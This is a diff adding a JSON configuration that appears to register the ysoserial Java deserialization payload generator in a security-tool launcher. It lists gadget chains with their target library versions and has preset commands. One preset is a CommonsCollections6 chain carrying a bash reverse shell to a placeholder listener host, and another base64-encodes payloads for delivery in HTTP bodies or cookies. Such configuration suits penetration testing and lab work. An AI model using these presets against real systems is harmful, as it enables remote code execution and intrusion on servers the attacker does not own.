@@ -1,0 +1,113 @@
+{
+  "tool": {
+    "id": "ysoserial",
+    "name": "ysoserial",
+    "description": "Generator of payloads for Java deserialization vulnerabilities - supports CommonsCollections / BeanShell / Groovy / ROME / Spring / Hibernate / JRE8u20 / etc. gadget chains",
+    "executable": "ysoserial/ysoserial-all.jar",
+    "runtime": "java",
+    "runtimeVersion": "8",
+    "launchMode": "cli",
+    "category": "exploit",
+    "subcategory": "deserialization",
+    "tier": "optional",
+    "tags": ["java", "deserialization", "payload", "rce", "gadget"],
+    "install": {
+      "method": "github",
+      "source": "frohoff/ysoserial"
+    },
+    "params": [
+      {
+        "label": "Payload",
+        "flag": "",
+        "type": "select",
+        "required": true,
+        "description": "Gadget chain to use",
+        "options": [
+          { "value": "CommonsCollections1", "label": "CommonsCollections1 (commons-collections 3.1)" },
+          { "value": "CommonsCollections2", "label": "CommonsCollections2 (commons-collections4 4.0)" },
+          { "value": "CommonsCollections3", "label": "CommonsCollections3" },
+          { "value": "CommonsCollections4", "label": "CommonsCollections4" },
+          { "value": "CommonsCollections5", "label": "CommonsCollections5" },
+          { "value": "CommonsCollections6", "label": "CommonsCollections6 (TransformedMap-free)" },
+          { "value": "CommonsCollections7", "label": "CommonsCollections7 (Hashtable)" },
+          { "value": "CommonsBeanutils1", "label": "CommonsBeanutils1" },
+          { "value": "JRE8u20", "label": "JRE8u20 (Oracle JRE up to 8u20)" },
+          { "value": "Jdk7u21", "label": "Jdk7u21 (Oracle JRE 7u21)" },
+          { "value": "ROME", "label": "ROME (Spring/JBoss legacy)" },
+          { "value": "Spring1", "label": "Spring1 (Spring up to 4.2)" },
+          { "value": "Spring2", "label": "Spring2 (later Spring)" },
+          { "value": "Hibernate1", "label": "Hibernate1" },
+          { "value": "Hibernate2", "label": "Hibernate2" },
+          { "value": "BeanShell1", "label": "BeanShell1" },
+          { "value": "Groovy1", "label": "Groovy1" },
+          { "value": "Clojure", "label": "Clojure" },
+          { "value": "JSON1", "label": "JSON1" },
+          { "value": "Vaadin1", "label": "Vaadin1" },
+          { "value": "MozillaRhino1", "label": "MozillaRhino1" },
+          { "value": "MozillaRhino2", "label": "MozillaRhino2" },
+          { "value": "FileUpload1", "label": "FileUpload1 (commons-fileupload)" },
+          { "value": "JBossInterceptors1", "label": "JBossInterceptors1" },
+          { "value": "JavassistWeld1", "label": "JavassistWeld1" }
+        ]
+      },
+      {
+        "label": "Command",
+        "flag": "",
+        "type": "string",
+        "required": true,
+        "description": "OS command to embed in the payload (executed on deserialization)",
+        "placeholder": "calc.exe"
+      }
+    ],
+    "skills": [
+      {
+        "id": "list-payloads",
+        "name": "List all payloads",
+        "description": "Print every available gadget chain plus the library versions each one is known to work against",
+        "args": "",
+        "tags": ["recon"]
+      },
+      {
+        "id": "cc1-calc",
+        "name": "CommonsCollections1 -> calc.exe (Windows demo)",
+        "description": "Classic Apache commons-collections 3.1 chain popping calc.exe; useful for quick lab demos",
+        "args": "CommonsCollections1 \"calc.exe\"",
+        "tags": ["demo", "windows"]
+      },
+      {
+        "id": "cc6-reverse-shell",
+        "name": "CommonsCollections6 -> bash reverse shell",
+        "description": "TransformedMap-free chain that often survives partial commons-collections patches",
+        "args": "CommonsCollections6 \"bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'\"",
+        "tags": ["reverse-shell", "linux"]
+      },
+      {
+        "id": "cc6-base64",
+        "name": "CommonsCollections6 payload, base64 for HTTP",
+        "description": "Generate a CC6 payload and pipe through base64 for transport in HTTP body / Cookie",
+        "args": "CommonsCollections6 \"{{command}}\" | base64",
+        "tags": ["http", "encode"]
+      },
+      {
+        "id": "spring1-quick",
+        "name": "Spring1 quick payload",
+        "description": "Spring 4.2 gadget chain - widely-used during PortSwigger-era assessments",
+        "args": "Spring1 \"{{command}}\"",
+        "tags": ["spring"]
+      },
+      {
+        "id": "rome-quick",
+        "name": "ROME quick payload",
+        "description": "ROME 1.0 chain (often present with legacy Spring/JBoss deployments)",
+        "args": "ROME \"{{command}}\"",
+        "tags": ["rome"]
+      }
+    ],
+    "output": {
+      "format": "text",
+      "produces": ["info"],
+      "detect": "ysoserial|gadget|Payload",
+      "patterns": []
+    }
+  }
+}
